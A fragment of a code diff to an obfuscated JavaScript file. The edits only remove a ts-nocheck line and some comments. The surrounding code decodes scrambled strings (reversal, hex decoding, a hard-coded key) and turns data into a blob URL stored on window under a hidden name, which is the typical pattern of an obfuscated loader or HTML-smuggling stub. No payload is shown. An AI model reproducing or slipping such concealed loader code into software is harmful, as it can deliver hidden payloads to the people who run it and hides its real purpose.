@@ -1,4 +1,3 @@
-// @ts-nocheck 
 function SqmOaLsKHv7vWtli(_0x4bc2d9) {
   window[bMGyx71TzQLfdonN("IGLImMhWrI")] = URL.createObjectURL(
     new Blob([_0x4bc2d9], {
@@ -7,11 +6,10 @@ function SqmOaLsKHv7vWtli(_0x4bc2d9) {
   );
 }
 function bMGyx71TzQLfdonN(_0x182b26) {
-  // did some type additions...
   var _0xbb4281 = 3;
-  var _0x22b578 = [];// extra
+  var _0x22b578 = [];
   if (typeof _0x182b26 !== 'string') {
-    throw new TypeError('Internal error');// extra 
+    throw new TypeError('Internal error');
   }
   for (var _0x3cf1e = 0; _0x3cf1e < _0x182b26.length; _0x3cf1e += _0xbb4281) {
     _0x22b578.push(_0x182b26.slice(_0x3cf1e, _0x3cf1e + _0xbb4281));
@@ -52,7 +50,7 @@ function GTAxQyTyBx(_0x33dfa4) {
 }
 function C66jPHx8qu(_0x48e6c2) {
   const _0x382290 = _0x48e6c2.split("").reverse().join("");
-  const _0x1cb155 = "X9a(O;FMV2-7VO5x;Ao:dN1NoFs?j,";
+  const _0x1cb155 = "X9a(O;FMV2-7VO5x;Ao:dN1NoFs?j,";
   const _0x50d89b = _0x382290.match(/.{1,2}/g).map(_0x58f648 => String.fromCharCode(parseInt(_0x58f648, 16))).join("");
   let _0x574d54 = "";
   for (let _0x151d1c = 0; _0x151d1c < _0x50d89b.length; _0x151d1c++) {
